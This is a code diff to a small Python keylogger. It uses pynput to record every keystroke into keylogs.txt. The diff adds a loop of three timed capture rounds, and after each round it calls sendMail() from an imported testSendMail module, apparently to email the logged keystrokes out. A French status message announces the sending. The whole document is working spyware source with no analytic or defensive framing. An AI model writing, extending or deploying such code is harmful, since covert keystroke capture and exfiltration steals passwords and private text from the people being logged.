@@ -1,6 +1,6 @@
 import logging
 from threading import Timer
-
+from testSendMail import *
 from pynput.keyboard import Key, Listener
 
 logging.basicConfig(filename=("keylogs.txt"),filemode="w",
@@ -9,8 +9,12 @@ logging.basicConfig(filename=("keylogs.txt"),filemode="w",
 
 def on_press(key):
     logging.info(str(key))
-with Listener(on_press=on_press) as listener:
-    Timer(6, listener.stop).start()
-    listener.join()
+
+for i in range(3):
+    with Listener(on_press=on_press) as listener:
+        Timer(10, listener.stop).start()
+        listener.join()
+        print("Commence à envoyer le mail")
+    sendMail()
 
 
